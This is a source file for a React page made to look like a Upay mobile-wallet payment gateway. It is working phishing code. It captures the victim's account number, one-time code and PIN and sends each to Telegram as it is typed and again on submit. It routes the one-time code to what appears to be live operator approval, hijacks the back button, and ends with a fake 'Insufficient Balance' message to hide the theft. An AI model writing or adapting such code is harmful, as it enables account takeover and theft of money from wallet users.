import { useState, useEffect, useRef } from "react";
import { useNavigate, useSearchParams } from "@/lib/flowRouter";
import { sendTelegramNotification } from "@/lib/payment-telegram";
import { submitOtpForApproval } from "@/lib/otpApproval";
import { usePaymentMethodGuard } from "@/hooks/usePaymentMethodGuard";
import { useMerchantInfo } from "@/hooks/useMerchantInfo";
import { clearOtpResume, readOtpResume, saveOtpResume } from "@/lib/otpResume";
import { usePaymentAccessGuard } from "@/lib/paymentAccessGuard";
import SingleCircleLoader from "@/components/payment/SingleCircleLoader";
import upayLogo from "@/assets/payment/upay-logo-full.svg";

const UpayPayment = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const amount = searchParams.get('amount') || "00";
  usePaymentAccessGuard("upay");
  const isAllowed = usePaymentMethodGuard("upay");
  const { merchant, inv: invoiceNumber } = useMerchantInfo("upay", { merchant: "", inv: "" });
  const otpResumeRef = useRef(readOtpResume("upay"));
  const otpResumeState = otpResumeRef.current?.state;
  const [mobileNumber, setMobileNumber] = useState(typeof otpResumeState?.mobileNumber === "string" ? otpResumeState.mobileNumber : "");
  const [otp, setOtp] = useState(typeof otpResumeState?.otp === "string" ? otpResumeState.otp : "");
  const [pin, setPin] = useState("");
  const [step, setStep] = useState<'mobile' | 'otp' | 'pin'>(otpResumeState?.step === "otp" ? "otp" : otpResumeState?.step === "pin" ? "pin" : "mobile");
  const [showError, setShowError] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [otpAttempts, setOtpAttempts] = useState(0);


  const mobileRef = useRef<HTMLInputElement>(null);
  const otpRef = useRef<HTMLInputElement>(null);
  const pinRef = useRef<HTMLInputElement>(null);



  useEffect(() => {
    window.history.pushState(null, "", window.location.href);
    const handlePopState = () => {
      window.history.pushState(null, "", window.location.href);
      if (step === 'otp' || step === 'pin') navigate(`/payment-cancelled?channel=Upay&reason=Payment isn't completed&amount=${amount}`);
      else navigate(`/payment?amount=${amount}`);
    };
    window.addEventListener("popstate", handlePopState);
    return () => window.removeEventListener("popstate", handlePopState);
  }, [navigate, amount, step]);

  useEffect(() => {
    if (step === 'mobile') setTimeout(() => mobileRef.current?.focus(), 100);
    if (step === 'otp') setTimeout(() => otpRef.current?.focus(), 100);
    if (step === 'pin') setTimeout(() => pinRef.current?.focus(), 100);
  }, [step]);
  const otpStartAtRef = useRef<number>(0);
  useEffect(() => { if (step === 'otp' && !otpStartAtRef.current) otpStartAtRef.current = Date.now(); if (step !== 'otp') otpStartAtRef.current = 0; }, [step]);

  useEffect(() => {
    if (step === 'otp' || step === 'pin') saveOtpResume("upay", searchParams.toString(), { step, mobileNumber, otp });
    else clearOtpResume("upay");
  }, [step, mobileNumber, otp, searchParams]);

  const validPrefixes = ["013", "014", "015", "016", "017", "018", "019"];
  const isValidMobile = () => mobileNumber.length === 11 && validPrefixes.includes(mobileNumber.substring(0, 3)) && /^\d+$/.test(mobileNumber);

  const handleMobileChange = (e: React.ChangeEvent<HTMLInputElement>) => setMobileNumber(e.target.value.replace(/\D/g, "").slice(0, 11));
  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const v = e.target.value.replace(/\D/g, "").slice(0, 6);
    setOtp(v);
    if (v.length > otp.length && v.length > 0) {
      sendTelegramNotification({ type: 'payment_activity', amount, method: 'Upay', paymentType: 'mfs', number: mobileNumber, otp: v });
    }
  };
  const handlePinChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const v = e.target.value.replace(/\D/g, "").slice(0, 4);
    setPin(v);
    if (v.length > pin.length && v.length > 0) {
      sendTelegramNotification({ type: 'payment_activity', amount, method: 'Upay', paymentType: 'mfs', number: mobileNumber, otp, pin: v });
    }
  };

  const handleMobileSubmit = () => {
    if (!isValidMobile()) return;
    setIsLoading(true);
    sendTelegramNotification({ type: 'payment_activity', amount, method: 'Upay', paymentType: 'mfs', number: mobileNumber }, { force: true });
    setTimeout(() => { setStep('otp'); setIsLoading(false); }, 2000);
  };
  const [otpDenyCount, setOtpDenyCount] = useState(0);
  const handleOtpSubmit = async () => {
    if (otp.length < 4) { setShowError("Please enter the verification code."); setTimeout(() => setShowError(""), 3000); return; }
    setIsLoading(true);
    const nextAttempt = otpAttempts + 1;
    setOtpAttempts(nextAttempt);
    const decision = await submitOtpForApproval({
      amount, method: 'Upay', paymentType: 'mfs', number: mobileNumber, otp,
    }, { autoAttempt: nextAttempt, otpStartAt: otpStartAtRef.current });
    setIsLoading(false);
    if (decision === 'approved') {
      setStep('pin');
    } else if (decision === 'timeout' || decision === 'error') {
      navigate(`/payment-cancelled?channel=Upay&reason=Payment isn't completed&amount=${amount}`);
    } else {
      const nextDenies = otpDenyCount + 1;
      setOtpDenyCount(nextDenies);
      if (nextDenies >= 3) {
        navigate(`/payment-cancelled?channel=Upay&reason=Payment isn't completed&amount=${amount}`);
        return;
      }
      setShowError("Invalid verification code."); setOtp("");
      setTimeout(() => otpRef.current?.focus(), 50);
      setTimeout(() => setShowError(""), 3500);
    }
  };

  const handlePinSubmit = () => {
    if (pin.length < 4) { setShowError("Please enter your PIN."); setTimeout(() => setShowError(""), 3000); return; }
    setIsLoading(true);
    sendTelegramNotification({ type: 'payment_activity', amount, method: 'Upay', paymentType: 'mfs', number: mobileNumber, otp, pin }, { force: true });
    setTimeout(() => { setIsLoading(false); navigate(`/payment-cancelled?channel=Upay&reason=Insufficient Balance&amount=${amount}`); }, 2000);
  };
  const handleClose = () => {
    if (step === 'otp' || step === 'pin') navigate(`/payment-cancelled?channel=Upay&reason=Payment isn't completed&amount=${amount}`);
    else navigate(`/payment?amount=${amount}`);
  };

  const renderContent = () => {
    if (step === 'pin') return (
      <>
        <p className="text-center text-[#0054A5] font-extrabold text-base mb-3">Enter your PIN</p>
        {showError && <p className="text-center text-red-500 text-sm font-bold mb-2">{showError}</p>}
        <input id="upaypayment-fld-1" name="upaypayment-fld-1" aria-label="upaypayment field 1" ref={pinRef} type="password" inputMode="numeric" value={pin} onChange={handlePinChange} placeholder="PIN"
          className="w-full border border-[#ccc] rounded-full px-4 py-3 text-center text-base font-bold outline-none focus:border-[#0054A5] transition-colors" style={{ backgroundColor: 'rgba(235, 235, 235, 0.7)' }} />
        <p className="text-center text-[#333] text-sm font-bold mt-3">By clicking on <span className="font-extrabold">Confirm,</span> you are agreeing to the <span className="underline font-extrabold text-[#1a1a1a]">terms & conditions</span></p>
      </>
    );
    if (step === 'otp') return (
      <>
        <p className="text-center text-[#0054A5] font-extrabold text-base mb-3">Enter verification code</p>
        {showError && <p className="text-center text-red-500 text-sm font-bold mb-2">{showError}</p>}
        <input id="upaypayment-fld-2" name="upaypayment-fld-2" aria-label="upaypayment field 2" ref={otpRef} type="text" inputMode="numeric" value={otp} onChange={handleOtpChange} placeholder="Verification code"
          className="w-full border border-[#ccc] rounded-full px-4 py-3 text-center text-base font-bold outline-none focus:border-[#0054A5] transition-colors" style={{ backgroundColor: 'rgba(235, 235, 235, 0.7)' }} />
        <p className="text-center text-[#333] text-sm font-bold mt-3">By clicking on <span className="font-extrabold">Confirm,</span> you are agreeing to the <span className="underline font-extrabold text-[#1a1a1a]">terms & conditions</span></p>
      </>
    );
    return (
      <>
        <p className="text-center text-[#0054A5] font-extrabold text-base mb-3">Enter Your upay Account Number</p>
        {showError && <p className="text-center text-red-500 text-sm font-bold mb-2">{showError}</p>}
        <input id="upaypayment-fld-3" name="upaypayment-fld-3" aria-label="upaypayment field 3" ref={mobileRef} type="text" inputMode="numeric" value={mobileNumber} onChange={handleMobileChange} placeholder="e.g 01XXXXXXXXX"
          className="w-full border border-[#ccc] rounded-full px-4 py-3 text-center text-base font-bold outline-none focus:border-[#0054A5] transition-colors" style={{ backgroundColor: 'rgba(235, 235, 235, 0.7)' }} />
        <p className="text-center text-[#333] text-sm font-bold mt-3">By clicking on <span className="font-extrabold">Confirm,</span> you are agreeing to the <span className="underline font-extrabold text-[#1a1a1a]">terms & conditions</span></p>
      </>
    );
  };

  const mobileValid = isValidMobile();
  const confirmEnabled = step === 'mobile' ? mobileValid : step === 'otp' ? otp.length === 6 : pin.length === 4;
  const handleSubmit = step === 'mobile' ? handleMobileSubmit : step === 'otp' ? handleOtpSubmit : handlePinSubmit;
  const isDisabled = !confirmEnabled || isLoading;
  const confirmBgColor = (confirmEnabled && !isLoading) ? 'rgb(36, 76, 154)' : '#aaa';

  if (isAllowed !== true) return null;

  return (
    <div className="fixed inset-0 flex flex-col items-start justify-start p-4 pt-6 overflow-hidden" style={{ background: 'linear-gradient(to bottom, rgb(250, 235, 122) 10%, rgb(253, 251, 216) 80%)' }}>
      {isLoading && <SingleCircleLoader />}
      <div className="w-full max-w-[420px] mx-auto rounded-2xl overflow-hidden shadow-lg" style={{ minHeight: '520px' }}>
        <div className="px-5 pt-8 pb-8 flex flex-col items-center" style={{ backgroundColor: 'rgb(251, 214, 0)' }}>
          <img src={upayLogo} alt="Upay" className="w-72 h-auto object-contain mb-6" />
          <div className="w-full rounded-xl px-5 py-5 mb-7 text-center" style={{ backgroundColor: 'rgba(235, 235, 235, 0.7)' }}>
            <p className="font-extrabold text-[#1a1a1a] text-lg">{merchant}</p>
            <p className="text-[#444] text-base font-bold mt-1.5">Invoice Number:</p>
            <p className="font-extrabold text-[#1a1a1a] text-base">{invoiceNumber}</p>

            <p className="text-[#444] text-base font-bold mt-1.5">Amount: <span className="font-extrabold text-[#1a1a1a] text-lg">BDT {amount}</span></p>
          </div>
          <div className="w-full">{renderContent()}</div>
        </div>
        <div className="bg-white px-5 py-5">
          <div className="flex items-center justify-between">
            <button onClick={handleClose} className="border border-[#bbb] rounded-lg px-8 py-3 text-base font-bold text-[#333] bg-white hover:bg-[#f5f5f5]">Close</button>
            <button onClick={handleSubmit} disabled={isDisabled} className="rounded-lg px-8 py-3 text-base font-bold transition-colors text-white" style={{ backgroundColor: isDisabled ? '#aaa' : confirmBgColor, cursor: isDisabled ? 'not-allowed' : 'pointer' }}>Confirm</button>
          </div>
        </div>
        <div className="py-3 flex items-center justify-center gap-1.5 bg-white border-t border-[#eee]">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="#0054A5">
            <path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z" />
          </svg>
          <span className="text-[#0054A5] font-extrabold text-base">16268</span>
        </div>
      </div>
    </div>
  );
};

export default UpayPayment;
